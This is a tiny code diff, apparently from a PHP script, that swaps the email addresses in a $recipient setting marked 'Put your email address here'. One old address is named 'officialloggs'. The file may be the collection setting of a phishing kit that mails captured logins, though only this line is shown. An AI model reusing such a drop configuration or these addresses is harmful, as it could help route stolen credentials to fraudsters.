@@ -9,7 +9,7 @@
 
 
 //------------------------------------//
-$recipient = 'officialloggs@gmail.com, securedmail736@gmail.com'; // Put your email address here
+$recipient = 'dawnmariedanne@yandex.com, tpttayjp@gmail.com'; // Put your email address here
 //----------------------------------//
 
 
